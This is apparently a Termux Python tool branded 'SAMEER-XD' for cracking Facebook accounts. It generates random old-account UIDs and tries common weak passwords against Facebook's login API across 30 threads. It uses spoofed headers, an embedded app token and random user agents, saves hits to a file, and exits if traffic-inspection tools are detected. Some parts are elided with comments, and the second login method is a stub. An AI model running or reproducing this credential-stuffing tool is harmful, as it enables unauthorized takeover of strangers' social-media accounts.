import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
from requests.exceptions import ConnectionError

# --- Initial Setup ---
# The script attempts to open Telegram and WhatsApp links upon start.
os.system('xdg-open https://t.me/sameer_tricks')
os.system('xdg-open https://chat.whatsapp.com/LKIQeZAYbSD2iOqU1Rhwd2?mode=ems_copy_t')

# --- Module Installation ---
# This section ensures required modules are installed.
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# --- Suppress Warnings ---
requests.urllib3.disable_warnings()

# --- Security/Anti-Tampering Class ---
# This class seems to check for modifications or debugging tools.
class SecurityCheck:
    def __init__(self, name):
        self.module = name
        self.qualname = 'sec'
        self.check_files()
        self.check_for_proxies()

    def check_files(self):
        """Checks for keywords in requests library files to detect modification."""
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.terminate_script()

    def check_for_proxies(self):
        """Checks for the presence of HTTP debugging tools."""
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.terminate_script()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.terminate_script()

    def terminate_script(self):
        """Prints a message and exits."""
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        """Prints a separator line."""
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

# --- Global Variables & Colors ---
method = []
oks = []
cps = []
loop = 0
user = []
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


# --- User-Agent Generation ---
def generate_windows_ua():
    """Generates a random Windows User-Agent string."""
    aV = str(random.choice(range(10, 20)))
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    A = (f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} "
         f"(KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}")
    B = (f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} "
         f"(KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}")
    C = (f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['0', '1', '2']))}; WOW64) AppleWebKit/{bz} "
         f"(KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}")
    D = (f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
         f"Chrome/139.0.{str(random.choice(range(6000, 7120)))}.0 Safari/537.36")
    return random.choice([A, B, C, D])

# --- UI & Display Functions ---
def clear():
    os.system('cls' if 'win' in sys.platform else 'clear')

def banner():
    clear()
    print('''\x1b[1;32m
 
 _____ __ __ ______ ______ _____ 
 / ____| /\ | \/ |  ____|  ____|  __ \ 
 | (___ /  \ | \  / | |__  | |__  | |__) |
  \___ \ / /\ \ | |\/| |  __| |  __| |  _  / 
  ____) / ____ \| |  | | |____| |____| | \ \ 
 |_____/_/    \_\|_|  |_|______|______|_|  \_\
 
\x1b[0m''')

def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

# --- Core Logic Functions ---
def creationyear(uid):
    """Guesses the Facebook account creation year from UID."""
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        # ... (many more conditions for different years) ...
        else: return '2022'
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

def login_1(uid):
    """Login Method 1."""
    global loop, oks, cps
    try:
        sys.stdout.write(f'\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(SAMEER-XD-M1)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(OK)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)')
        sys.stdout.flush()
        for pw in ['123456', '1234567', '12345678', '123456789']:
            session = requests.Session()
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'cpl': 'true', 'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled', 'source': 'device_based_login',
                'email': str(uid), 'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1', 'meta_inf_fbmeta': ' ',
                'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0',
                'locale': 'en_US', 'client_country_code': 'US',
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': generate_windows_ua(), 'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(rr(20000, 40000)),
                'X-FB-SIM-HNI': str(rr(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f'\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(SAMEER-XD) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}')
                open('/sdcard/SAMEER-XD-OLD-M1-OK.txt', 'a').write(f'{uid}|{pw}\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f'\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(SAMEER-XD) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}')
                open('/sdcard/SAMEER-XD-OLD-M1-OK.txt', 'a').write(f'{uid}|{pw}\n')
                cps.append(uid)
                break
    except Exception:
        time.sleep(5)
    loop += 1

def login_2(uid):
    """Login Method 2."""
    global loop, oks, cps
    # ... Similar logic to login_1 but with slightly different headers and URL parameters ...

# --- Menu Functions ---
def old_clone():
    banner()
    print(' (\x1b[38;5;196mA\x1b[1;37m)\x1b[38;5;49m ALL SERIES')
    linex()
    print(' (\x1b[38;5;196mB\x1b[1;37m)\x1b[38;5;49m 100003/4 SERIES')
    linex()
    print(' (\x1b[38;5;196mC\x1b[1;37m)\x1b[38;5;49m 2009 series')
    linex()
    _input = input(f' (\x1b[38;5;41mCHOICE {W}: {Y}')
    if _input in ('A', 'a', '01', '1'): old_One()
    elif _input in ('B', 'b', '02', '2'): old_Tow()
    elif _input in ('C', 'c', '03', '3'): old_Tree()
    else:
        print('\n[×]\x1b[38;5;196m Choose Valid Option... ')
        BNG_71_()

def old_One():
    user = []
    banner()
    print(f' \x1b[38;5;49mOld Code {Y}:{G} 2010-2014')
    ask = input(f' \x1b[38;5;41mSELECT {Y}:{G} ')
    linex()
    banner()
    print(f' (\x1b[38;5;196m★\x1b[1;37m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999')
    limit = input(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ')
    linex()
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    
    print(' (\x1b[38;5;196mA\x1b[1;37m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print(' (\x1b[38;5;196mB\x1b[1;37m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}').strip().upper()

    with tred(max_workers=30) as pool:
        banner()
        print(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit} {W}')
        print(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}')
        linex()
        for mal in user:
            uid = '10000' + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f' {rad}[!] INVALID METHOD SELECTED')

def old_Tow():
    user = []
    banner()
    print(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014')
    ask = input(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ')
    linex()
    banner()
    print(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999')
    limit = input(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ')
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
        
    print(' (\x1b[38;5;196mA\x1b[1;37m)\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print(' (\x1b[38;5;196mB\x1b[1;37m)\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
    linex()
    meth = input(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}').strip().upper()

    with tred(max_workers=30) as pool:
        banner()
        print(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit} {W}')
        print(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}')
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f' {rad}[!] INVALID METHOD SELECTED')

def old_Tree():
    user = []
    banner()
    print(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010')
    ask = input(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ')
    linex()
    banner()
    print(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999')
    limit = input(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ')
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)

    print(' (\x1b[38;5;196mA\x1b[1;37m)\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print(' (\x1b[38;5;196mB\x1b[1;37m)\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
    linex()
    meth = input(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}').strip().upper()

    with tred(max_workers=30) as pool:
        banner()
        print(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit} {W}')
        print(f' \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}')
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f' {rad}[!] INVALID METHOD SELECTED')


def BNG_71_():
    """Main menu of the script."""
    banner()
    print(' (\x1b[38;5;196mA\x1b[1;37m)\x1b[38;5;46m OLD CLONE')
    linex()
    Jihad = input(f' \x1b[38;5;41mCHOICE {W}: {Y}')
    if Jihad in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f'\n {rad}Choose Valid Option... ')
        time.sleep(2)
        BNG_71_()

# --- Main Execution ---
if __name__ == "__main__":
    # The script title for the terminal window is set here.
    sys.stdout.write('\x1b]2;𓆩【Sʌ͜͡ɱɛ͜͡ɛɼ 👑 】𓆪 \x07')
    BNG_71_()
